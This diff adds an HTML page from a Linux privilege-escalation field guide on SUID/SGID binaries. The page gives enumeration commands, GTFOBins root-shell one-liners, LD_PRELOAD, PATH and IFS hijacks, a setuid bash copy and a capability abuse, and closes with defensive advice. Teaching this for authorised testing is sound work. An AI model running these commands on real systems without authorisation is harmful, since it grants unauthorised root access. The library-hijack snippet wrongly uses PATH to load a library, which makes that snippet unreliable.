@@ -1,0 +1,335 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <meta name="color-scheme" content="dark">
+  <meta name="theme-color" content="#050505">
+  <meta name="description" content="Privilege Escalation part 2 of 10. Find privileged binaries, abuse GTFOBins entries and audit writable SUID files.">
+  <title>Part 02: SUID and SGID Binaries | 0XMAP Privilege Escalation</title>
+  <link rel="icon" href="../static/favicon.svg" type="image/svg+xml">
+  <link rel="stylesheet" href="../static/guide.css">
+</head>
+<body data-root="../">
+  <a class="g-skip" href="#main">Skip to content</a>
+  
+<header class="g-top">
+  <div class="g-top-inner">
+    <a class="g-brand" href="../index.html" aria-label="0XMAP Linux field guide home">
+      <span class="g-mark" aria-hidden="true"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.7" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M4 7l4 5-4 5"/><path d="M12 17h8"/></svg></span>
+      <span class="g-brand-text">
+        <span class="g-name">0XMAP</span>
+        <span class="g-sub">Linux field guide</span>
+      </span>
+    </a>
+    <div class="g-top-actions">
+      <nav class="g-top-nav" aria-label="Guide">
+        <a href="../index.html#about">Guide</a>
+        <a href="../index.html#foundations">Foundations</a>
+        <a href="../index.html#privesc">Privilege escalation</a>
+        <a href="../index.html#chapters">Chapters</a>
+      </nav>
+      <button type="button" class="g-search-btn" data-search-open aria-label="Search the guide">
+        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.7" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><circle cx="11" cy="11" r="6.5"/><path d="m16 16 4 4"/></svg>
+        <span>Search</span>
+        <kbd>/</kbd>
+      </button>
+      <span class="g-context-pill">Privilege escalation</span>
+      <button type="button" class="g-menu-btn" data-menu-toggle aria-label="Open chapter menu" aria-expanded="false"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.7" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M4 7h16M4 12h16M4 17h16"/></svg></button>
+    </div>
+  </div>
+</header>
+  
+<div class="g-doc-layout">
+  
+<aside class="g-sidebar" data-sidebar aria-label="Privilege escalation navigation">
+  <div class="g-sidebar-head">
+    <div>
+      <p class="g-sidebar-kicker">Privilege Escalation</p>
+      <p class="g-sidebar-count">10 parts / practitioner path</p>
+    </div>
+    <button type="button" class="g-side-close" data-menu-close aria-label="Close handbook menu">
+      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.7" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M6 6l12 12M18 6 6 18"/></svg>
+    </button>
+  </div>
+  <nav class="g-side-nav">
+    <section class="g-nav-part">
+      <div class="g-nav-part-head"><span class="g-nav-part-num">PE</span><span>Handbook</span></div>
+      <ol><li><a class="g-nav-link g-nav-link-simple" href="../privesc/01-sudo-misconfigurations.html"><span class="g-nav-num">01</span><span class="g-nav-title">Sudo</span></a></li><li><a class="g-nav-link g-nav-link-simple" href="../privesc/02-suid-sgid-binaries.html" aria-current="page"><span class="g-nav-num">02</span><span class="g-nav-title">SUID and SGID</span></a></li><li><a class="g-nav-link g-nav-link-simple" href="../privesc/03-linux-capabilities.html"><span class="g-nav-num">03</span><span class="g-nav-title">Capabilities</span></a></li><li><a class="g-nav-link g-nav-link-simple" href="../privesc/04-cron-jobs.html"><span class="g-nav-num">04</span><span class="g-nav-title">Cron jobs</span></a></li><li><a class="g-nav-link g-nav-link-simple" href="../privesc/05-writable-system-files.html"><span class="g-nav-num">05</span><span class="g-nav-title">Writable files</span></a></li><li><a class="g-nav-link g-nav-link-simple" href="../privesc/06-path-hijacking.html"><span class="g-nav-num">06</span><span class="g-nav-title">PATH hijacking</span></a></li><li><a class="g-nav-link g-nav-link-simple" href="../privesc/07-environment-variable-abuse.html"><span class="g-nav-num">07</span><span class="g-nav-title">Environment</span></a></li><li><a class="g-nav-link g-nav-link-simple" href="../privesc/08-kernel-exploits.html"><span class="g-nav-num">08</span><span class="g-nav-title">Kernel</span></a></li><li><a class="g-nav-link g-nav-link-simple" href="../privesc/09-service-misconfigurations.html"><span class="g-nav-num">09</span><span class="g-nav-title">Services</span></a></li><li><a class="g-nav-link g-nav-link-simple" href="../privesc/10-nfs-misconfigurations.html"><span class="g-nav-num">10</span><span class="g-nav-title">NFS</span></a></li></ol>
+    </section>
+  </nav>
+  <a class="g-side-guide" href="../chapters/26-automating-linux-privilege-escalation-checks.html">
+    <span class="g-side-guide-kicker">Apply it</span>
+    <strong>Chapter 26 / automation</strong>
+    <span>Turn the checks into a repeatable enumeration pass</span>
+  </a>
+  <a class="g-side-guide" href="../index.html#foundations">
+    <span class="g-side-guide-kicker">Companion handbook</span>
+    <strong>Linux Foundations</strong>
+    <span>10 parts from first command to secure baseline</span>
+  </a>
+  <p class="g-sidebar-note">Use these techniques only in labs, CTFs or systems you own and have written permission to test.</p>
+</aside>
+<div class="g-scrim" data-menu-close hidden></div>
+  <main class="g-content" id="main">
+    <article class="g-article">
+      <header class="g-chapter-head">
+        <nav class="g-chapter-crumb" aria-label="Breadcrumb">
+          <a href="../index.html">Field guide</a><span>/</span>
+          <a href="../index.html#privesc">Privilege Escalation</a><span>/</span>
+          <span>Part 02</span>
+        </nav>
+        <p class="g-kicker">Privilege Escalation / Part 02</p>
+        <h1>SUID and SGID Binaries</h1>
+        <p class="g-deck">Find privileged binaries, abuse GTFOBins entries and audit writable SUID files.</p>
+        <div class="g-chapter-meta">
+          <span>7 min read</span>
+          <span>6 sections</span>
+          <span>11 code blocks</span>
+          <span>Part 02 / 10</span>
+        </div>
+      </header>
+      
+<details class="g-toc-mobile">
+  <summary>On this page <span>6 sections</span></summary>
+  <nav aria-label="On this page"><a class="g-toc-link depth-2" href="#suid-sgid-binaries-for-privilege-escalation" data-toc-link>SUID/SGID Binaries for Privilege Escalation</a><a class="g-toc-link depth-3" href="#1-understanding-suid-sgid" data-toc-link>1. Understanding SUID/SGID</a><a class="g-toc-link depth-3" href="#2-enumeration-finding-suid-sgid-binaries" data-toc-link>2. Enumeration: Finding SUID/SGID Binaries</a><a class="g-toc-link depth-3" href="#3-exploitation-strategies" data-toc-link>3. Exploitation Strategies</a><a class="g-toc-link depth-3" href="#4-automated-enumeration-tools" data-toc-link>4. Automated Enumeration Tools</a><a class="g-toc-link depth-3" href="#5-defensive-measures" data-toc-link>5. Defensive Measures</a></nav>
+</details>
+      <div class="g-prose"><h2 id="suid-sgid-binaries-for-privilege-escalation">SUID/SGID Binaries for Privilege Escalation<a aria-label="Link to this section" class="g-anchor" href="#suid-sgid-binaries-for-privilege-escalation">#</a></h2>
+<p>SUID (Set User ID) and SGID (Set Group ID) are special Unix/Linux permissions that allow a binary to execute with the privileges of its <strong>owner</strong> (SUID) or <strong>group</strong> (SGID), rather than the user running it. This is necessary for legitimate operations (e.g., <code>passwd</code> needs root to update <code>/etc/shadow</code>), but misconfigurations or vulnerabilities in these binaries are a classic privilege escalation vector.</p>
+<hr/>
+<h3 id="1-understanding-suid-sgid">1. Understanding SUID/SGID<a aria-label="Link to this section" class="g-anchor" href="#1-understanding-suid-sgid">#</a></h3>
+<ul>
+<li><strong>SUID Bit</strong>: When set on an executable, it runs with the <strong>owner's</strong> privileges. If owned by root, it runs as root.
+<ul>
+<li>Permission display: <code>-rwsr-xr-x</code> (the <code>s</code> replaces the owner's <code>x</code>)</li>
+</ul>
+</li>
+<li><strong>SGID Bit</strong>: When set on an executable, it runs with the <strong>group's</strong> privileges.
+<ul>
+<li>Permission display: <code>-rwxr-sr-x</code> (the <code>s</code> replaces the group's <code>x</code>)</li>
+</ul>
+</li>
+</ul>
+<p><strong>Key Distinction from Sudo</strong>: While sudo is configured per-user via <code>/etc/sudoers</code>, SUID/SGID binaries are <strong>system-wide</strong> - any user on the system can execute them with elevated privileges if the file permissions allow it.</p>
+<hr/>
+<h3 id="2-enumeration-finding-suid-sgid-binaries">2. Enumeration: Finding SUID/SGID Binaries<a aria-label="Link to this section" class="g-anchor" href="#2-enumeration-finding-suid-sgid-binaries">#</a></h3>
+<p><strong>Primary Commands</strong>:</p>
+<div class="g-code"><div class="g-code-bar"><span class="g-code-lang">bash</span><button aria-label="Copy code block" class="g-copy" data-copy-code="" type="button">Copy</button></div><pre tabindex="0"><code class="g-code-body language-bash">find<span class="w"> </span>/<span class="w"> </span>-perm<span class="w"> </span>-4000<span class="w"> </span>-type<span class="w"> </span>f<span class="w"> </span><span class="m">2</span>&gt;/dev/null
+
+<span class="c1"># Find all SGID binaries</span>
+find<span class="w"> </span>/<span class="w"> </span>-perm<span class="w"> </span>-2000<span class="w"> </span>-type<span class="w"> </span>f<span class="w"> </span><span class="m">2</span>&gt;/dev/null
+
+<span class="c1"># Find both SUID and SGID</span>
+find<span class="w"> </span>/<span class="w"> </span>-perm<span class="w"> </span>-6000<span class="w"> </span>-type<span class="w"> </span>f<span class="w"> </span><span class="m">2</span>&gt;/dev/null
+
+<span class="c1"># More comprehensive search</span>
+find<span class="w"> </span>/<span class="w"> </span>-user<span class="w"> </span>root<span class="w"> </span>-perm<span class="w"> </span>-4000<span class="w"> </span>-type<span class="w"> </span>f<span class="w"> </span>-exec<span class="w"> </span>ls<span class="w"> </span>-la<span class="w"> </span><span class="o">{}</span><span class="w"> </span><span class="se">\;</span><span class="w"> </span><span class="m">2</span>&gt;/dev/null
+</code></pre></div>
+<p><strong>Legacy Method</strong> (older systems):</p>
+<div class="g-code"><div class="g-code-bar"><span class="g-code-lang">bash</span><button aria-label="Copy code block" class="g-copy" data-copy-code="" type="button">Copy</button></div><pre tabindex="0"><code class="g-code-body language-bash">find<span class="w"> </span>/<span class="w"> </span>-type<span class="w"> </span>f<span class="w"> </span><span class="se">\(</span><span class="w"> </span>-perm<span class="w"> </span>-04000<span class="w"> </span>-o<span class="w"> </span>-perm<span class="w"> </span>-02000<span class="w"> </span><span class="se">\)</span><span class="w"> </span>-exec<span class="w"> </span>ls<span class="w"> </span>-al<span class="w"> </span><span class="o">{}</span><span class="w"> </span><span class="se">\;</span><span class="w"> </span><span class="m">2</span>&gt;/dev/null
+</code></pre></div>
+<hr/>
+<h3 id="3-exploitation-strategies">3. Exploitation Strategies<a aria-label="Link to this section" class="g-anchor" href="#3-exploitation-strategies">#</a></h3>
+<h4 id="a-known-vulnerable-binaries-gtfobins">A. Known Vulnerable Binaries (GTFOBins)<a aria-label="Link to this section" class="g-anchor" href="#a-known-vulnerable-binaries-gtfobins">#</a></h4>
+<p>Many common binaries have built-in functions that can spawn shells when run with SUID privileges. Reference <strong>GTFOBins</strong> for the exact exploit syntax.</p>
+<p><strong>Common Examples</strong>:</p>
+<div class="g-table-wrap"><table class="g-table">
+<thead>
+<tr>
+<th>Binary</th>
+<th>Exploit Command</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>find</code></td>
+<td><code>find . -exec /bin/sh -p \; -quit</code></td>
+</tr>
+<tr>
+<td><code>vim</code> / <code>vi</code></td>
+<td><code>vim -c ':!/bin/sh'</code></td>
+</tr>
+<tr>
+<td><code>nano</code></td>
+<td><code>nano</code> → <code>^R^X</code> → <code>reset; sh 1&gt;&amp;0 2&gt;&amp;0</code></td>
+</tr>
+<tr>
+<td><code>less</code> / <code>more</code></td>
+<td><code>less /etc/profile</code> → <code>!/bin/sh</code></td>
+</tr>
+<tr>
+<td><code>awk</code></td>
+<td><code>awk 'BEGIN {system("/bin/sh")}'</code></td>
+</tr>
+<tr>
+<td><code>cp</code></td>
+<td>Copy <code>/etc/shadow</code> or <code>/etc/sudoers</code> to writable location</td>
+</tr>
+<tr>
+<td><code>nmap</code> (old)</td>
+<td><code>nmap --interactive</code> → <code>!sh</code></td>
+</tr>
+<tr>
+<td><code>tar</code></td>
+<td><code>tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh</code></td>
+</tr>
+</tbody>
+</table></div>
+<p><strong>Note</strong>: The <code>-p</code> flag in <code>sh -p</code> preserves the SUID privileges; without it, some shells drop privileges.</p>
+<hr/>
+<h4 id="b-shared-object-hijacking-ld-preload-ld-library-path">B. Shared Object Hijacking (LD_PRELOAD / LD_LIBRARY_PATH)<a aria-label="Link to this section" class="g-anchor" href="#b-shared-object-hijacking-ld-preload-ld-library-path">#</a></h4>
+<p>If a SUID binary loads a shared library from a <strong>relative path</strong> or <strong>user-writable directory</strong>, an attacker can replace or preload a malicious library.</p>
+<p><strong>LD_PRELOAD Exploit</strong>:</p>
+<div class="g-code"><div class="g-code-bar"><span class="g-code-lang">bash</span><button aria-label="Copy code block" class="g-copy" data-copy-code="" type="button">Copy</button></div><pre tabindex="0"><code class="g-code-body language-bash"><span class="c1"># Create malicious shared library</span>
+<span class="nb">echo</span><span class="w"> </span><span class="s1">'int getuid() { return 0; }'</span><span class="w"> </span>&gt;<span class="w"> </span>exploit.c
+gcc<span class="w"> </span>-shared<span class="w"> </span>-fPIC<span class="w"> </span>exploit.c<span class="w"> </span>-o<span class="w"> </span>exploit.so
+
+<span class="c1"># Run SUID binary with LD_PRELOAD (if allowed)</span>
+<span class="nv">LD_PRELOAD</span><span class="o">=</span>./exploit.so<span class="w"> </span>/path/to/suid/binary
+</code></pre></div>
+<p><strong>Library Path Hijack</strong>:</p>
+<div class="g-code"><div class="g-code-bar"><span class="g-code-lang">bash</span><button aria-label="Copy code block" class="g-copy" data-copy-code="" type="button">Copy</button></div><pre tabindex="0"><code class="g-code-body language-bash"><span class="c1"># If binary loads libxyz.so from ./lib/</span>
+mkdir<span class="w"> </span>lib
+gcc<span class="w"> </span>-shared<span class="w"> </span>-fPIC<span class="w"> </span>-o<span class="w"> </span>lib/libxyz.so<span class="w"> </span>malicious.c
+<span class="nv">PATH</span><span class="o">=</span>.:<span class="nv">$PATH</span><span class="w"> </span>/path/to/suid/binary
+</code></pre></div>
+<p><strong>Mitigation</strong>: Modern SUID binaries ignore <code>LD_PRELOAD</code> and <code>LD_LIBRARY_PATH</code> for security.</p>
+<hr/>
+<h4 id="c-environment-variable-exploits">C. Environment Variable Exploits<a aria-label="Link to this section" class="g-anchor" href="#c-environment-variable-exploits">#</a></h4>
+<p>Some SUID binaries use environment variables in unsafe ways:</p>
+<ul>
+<li>
+<p><strong>PATH Hijacking</strong>: If a SUID binary calls a command without using absolute paths (e.g., <code>system("ls")</code> instead of <code>/bin/ls</code>), an attacker can modify the <code>PATH</code> to point to a malicious binary:</p>
+<div class="g-code"><div class="g-code-bar"><span class="g-code-lang">bash</span><button aria-label="Copy code block" class="g-copy" data-copy-code="" type="button">Copy</button></div><pre tabindex="0"><code class="g-code-body language-bash"><span class="nb">export</span><span class="w"> </span><span class="nv">PATH</span><span class="o">=</span>/tmp:<span class="nv">$PATH</span>
+<span class="nb">echo</span><span class="w"> </span><span class="s1">'/bin/sh'</span><span class="w"> </span>&gt;<span class="w"> </span>/tmp/ls
+chmod<span class="w"> </span>+x<span class="w"> </span>/tmp/ls
+/usr/bin/suid-binary<span class="w">   </span><span class="c1"># Now executes /tmp/ls as root</span>
+</code></pre></div>
+</li>
+<li>
+<p><strong>IFS Exploitation</strong>: The <code>IFS</code> (Internal Field Separator) variable can be exploited in shell scripts with SUID:</p>
+<div class="g-code"><div class="g-code-bar"><span class="g-code-lang">bash</span><button aria-label="Copy code block" class="g-copy" data-copy-code="" type="button">Copy</button></div><pre tabindex="0"><code class="g-code-body language-bash"><span class="nb">export</span><span class="w"> </span><span class="nv">IFS</span><span class="o">=</span><span class="s1">'/'</span><span class="w"> </span><span class="p">;</span><span class="w"> </span>/path/to/suid/script
+</code></pre></div>
+</li>
+</ul>
+<hr/>
+<h4 id="d-buffer-overflows-and-memory-corruption">D. Buffer Overflows &amp; Memory Corruption<a aria-label="Link to this section" class="g-anchor" href="#d-buffer-overflows-and-memory-corruption">#</a></h4>
+<p>Historically, many SUID binaries have had memory corruption vulnerabilities. While patched on modern systems, legacy systems may still be vulnerable.</p>
+<p><strong>Modern Example - CVE-2021-3156</strong>: A heap-based buffer overflow in <code>sudo</code>, a setuid-root binary, allowed local users to escalate to root on vulnerable versions. The bug was fixed in sudo 1.9.5p2. Patch level matters: a setuid binary is only a lead until you confirm the installed version is vulnerable.</p>
+<hr/>
+<h4 id="e-weak-file-permissions-writable-suid-binaries">E. Weak File Permissions (Writable SUID Binaries)<a aria-label="Link to this section" class="g-anchor" href="#e-weak-file-permissions-writable-suid-binaries">#</a></h4>
+<p>Sometimes an SUID binary is <strong>world-writable</strong>:</p>
+<div class="g-code"><div class="g-code-bar"><span class="g-code-lang">bash</span><button aria-label="Copy code block" class="g-copy" data-copy-code="" type="button">Copy</button></div><pre tabindex="0"><code class="g-code-body language-bash"><span class="c1"># Check for writable SUID binaries</span>
+find<span class="w"> </span>/<span class="w"> </span>-perm<span class="w"> </span>-4000<span class="w"> </span>-perm<span class="w"> </span>-o+w<span class="w"> </span>-type<span class="w"> </span>f<span class="w"> </span><span class="m">2</span>&gt;/dev/null
+</code></pre></div>
+<p>If found, an attacker can:</p>
+<ol>
+<li>Overwrite the binary with a custom malicious executable</li>
+<li>Set the SUID bit on the new binary</li>
+<li>Execute it to get root</li>
+</ol>
+<div class="g-code"><div class="g-code-bar"><span class="g-code-lang">bash</span><button aria-label="Copy code block" class="g-copy" data-copy-code="" type="button">Copy</button></div><pre tabindex="0"><code class="g-code-body language-bash">cp<span class="w"> </span>/bin/bash<span class="w"> </span>/tmp/rootbash
+chmod<span class="w"> </span>+s<span class="w"> </span>/tmp/rootbash
+/tmp/rootbash<span class="w"> </span>-p<span class="w">  </span><span class="c1"># -p preserves privileges</span>
+</code></pre></div>
+<hr/>
+<h4 id="f-capability-leaks-posix-capabilities">F. Capability Leaks (POSIX Capabilities)<a aria-label="Link to this section" class="g-anchor" href="#f-capability-leaks-posix-capabilities">#</a></h4>
+<p>Modern Linux uses <strong>capabilities</strong> instead of full SUID root. Misconfigured capabilities can be equally dangerous.</p>
+<p><strong>Check capabilities</strong>:</p>
+<div class="g-code"><div class="g-code-bar"><span class="g-code-lang">bash</span><button aria-label="Copy code block" class="g-copy" data-copy-code="" type="button">Copy</button></div><pre tabindex="0"><code class="g-code-body language-bash">getcap<span class="w"> </span>-r<span class="w"> </span>/<span class="w"> </span><span class="m">2</span>&gt;/dev/null
+</code></pre></div>
+<p><strong>Dangerous Capabilities</strong>:</p>
+<ul>
+<li><code>cap_setuid+ep</code>: Can change UID to root</li>
+<li><code>cap_sys_admin+ep</code>: Can mount filesystems, etc.</li>
+<li><code>cap_dac_override+ep</code>: Can bypass file permissions</li>
+</ul>
+<p><strong>Example Exploit</strong>:</p>
+<div class="g-code"><div class="g-code-bar"><span class="g-code-lang">bash</span><button aria-label="Copy code block" class="g-copy" data-copy-code="" type="button">Copy</button></div><pre tabindex="0"><code class="g-code-body language-bash"><span class="c1"># Python with cap_setuid capability</span>
+python3<span class="w"> </span>-c<span class="w"> </span><span class="s1">'import os; os.setuid(0); os.system("/bin/bash")'</span>
+</code></pre></div>
+<hr/>
+<h3 id="4-automated-enumeration-tools">4. Automated Enumeration Tools<a aria-label="Link to this section" class="g-anchor" href="#4-automated-enumeration-tools">#</a></h3>
+<p>Several scripts automate the discovery of misconfigured SUID/SGID binaries:</p>
+<ul>
+<li><strong>LinPEAS</strong> - Comprehensive Linux privilege escalation checker</li>
+<li><strong>LinEnum</strong> - Lightweight enumeration script</li>
+<li><strong>GTFOBins</strong> - Web-based reference for binary exploitation</li>
+<li><strong>SUID3NUM</strong> - Dedicated SUID enumeration tool</li>
+</ul>
+<p><strong>LinPEAS SUID check snippet</strong>:</p>
+<div class="g-code"><div class="g-code-bar"><span class="g-code-lang">bash</span><button aria-label="Copy code block" class="g-copy" data-copy-code="" type="button">Copy</button></div><pre tabindex="0"><code class="g-code-body language-bash">./linpeas.sh<span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span>-i<span class="w"> </span><span class="s2">"suid"</span>
+</code></pre></div>
+<hr/>
+<h3 id="5-defensive-measures">5. Defensive Measures<a aria-label="Link to this section" class="g-anchor" href="#5-defensive-measures">#</a></h3>
+<p><strong>For System Administrators</strong>:</p>
+<ul>
+<li><strong>Minimize SUID Binaries</strong>: Remove SUID bits from unnecessary binaries (<code>chmod u-s /path/to/binary</code>)</li>
+<li><strong>Use Capabilities</strong>: Replace SUID with fine-grained <code>setcap</code> where possible</li>
+<li><strong>Regular Audits</strong>: Periodically scan for new SUID binaries</li>
+<li><strong>Mount Options</strong>: Use <code>nosuid</code> on partitions like <code>/tmp</code> and <code>/home</code></li>
+<li><strong>SELinux/AppArmor</strong>: Use MAC systems to restrict SUID binary behavior</li>
+<li><strong>Monitor Logs</strong>: Watch for unusual SUID binary executions</li>
+</ul>
+</div>
+      <p class="g-source-note">Privilege Escalation handbook: Part 02 of 10. Adapted from <a href="https://github.com/JoramMalley/Linux-privilege-escalation" target="_blank" rel="noopener noreferrer">JoramMalley's Linux privilege escalation notes</a> and corrected where public advisories differ. Verify every version, CVE and command against vendor documentation. Use only in labs, CTFs or systems you own and have written permission to test.</p>
+      <div class="g-foundation-cta">
+        <div>
+          <p class="g-kicker">Apply it</p>
+          <strong>Automate the enumeration.</strong>
+          <p>Chapter 26 turns these checks into a repeatable collection and validation pass.</p>
+        </div>
+        <a class="g-btn primary" href="../chapters/26-automating-linux-privilege-escalation-checks.html">
+          Open Chapter 26 <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.7" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M5 12h14"/><path d="m13 6 6 6-6 6"/></svg>
+        </a>
+      </div>
+      <nav class="g-chapter-nav" aria-label="Privilege escalation navigation"><a class="g-chapter-card" href="../privesc/01-sudo-misconfigurations.html" data-prev-privesc><span class="g-chapter-card-label">Previous / Part 01</span><strong>Sudo Misconfigurations</strong></a><a class="g-chapter-card" href="../privesc/03-linux-capabilities.html" data-next-privesc><span class="g-chapter-card-label">Next / Part 03</span><strong>Linux Capabilities</strong></a></nav>
+    </article>
+  </main>
+  
+<aside class="g-toc" aria-label="On this page">
+  <div class="g-toc-inner">
+    <p class="g-toc-kicker">On this page</p>
+    <nav class="g-toc-nav"><a class="g-toc-link depth-2" href="#suid-sgid-binaries-for-privilege-escalation" data-toc-link>SUID/SGID Binaries for Privilege Escalation</a><a class="g-toc-link depth-3" href="#1-understanding-suid-sgid" data-toc-link>1. Understanding SUID/SGID</a><a class="g-toc-link depth-3" href="#2-enumeration-finding-suid-sgid-binaries" data-toc-link>2. Enumeration: Finding SUID/SGID Binaries</a><a class="g-toc-link depth-3" href="#3-exploitation-strategies" data-toc-link>3. Exploitation Strategies</a><a class="g-toc-link depth-3" href="#4-automated-enumeration-tools" data-toc-link>4. Automated Enumeration Tools</a><a class="g-toc-link depth-3" href="#5-defensive-measures" data-toc-link>5. Defensive Measures</a></nav>
+    <div class="g-toc-foot">Part 02 / 6 sections</div>
+  </div>
+</aside>
+</div>
+<footer class="g-site-foot g-docs-foot">
+  <div class="g-foot-main">
+    <span>0XMAP field guide / 30 chapters / 2 companion handbooks</span>
+    <span>Created by 0xbit</span>
+  </div>
+  <div class="g-foot-links">
+    <a href="../index.html">Home</a>
+    <a href="../index.html#foundations">Foundations</a>
+    <a href="../index.html#privesc">Privilege escalation</a>
+    <a href="../index.html#chapters">Chapters</a>
+    <button type="button" class="g-link-btn" data-search-open>Search</button>
+  </div>
+</footer>
+  
+<div class="g-search" data-search-modal hidden>
+  <div class="g-search-panel" role="dialog" aria-modal="true" aria-labelledby="g-search-title">
+    <div class="g-search-top">
+      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.7" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><circle cx="11" cy="11" r="6.5"/><path d="m16 16 4 4"/></svg>
+      <label class="g-visually-hidden" for="g-search-input" id="g-search-title">Search the guide</label>
+      <input class="g-search-input" id="g-search-input" data-search-input type="search"
+             placeholder="Search chapters, handbooks and commands..." autocomplete="off" spellcheck="false">
+      <kbd>Esc</kbd>
+      <button type="button" class="g-icon-btn" data-search-close aria-label="Close search">
+        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.7" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M6 6l12 12M18 6 6 18"/></svg>
+      </button>
+    </div>
+    <div class="g-search-results" data-search-results></div>
+    <div class="g-search-foot">
+      <span><kbd>Up</kbd><kbd>Down</kbd> to move</span>
+      <span><kbd>Enter</kbd> to open</span>
+      <span data-search-count></span>
+    </div>
+  </div>
+</div>
+  <script src="../static/guide-data.js"></script>
+  <script src="../static/guide.js" defer></script>
+</body>
+</html>
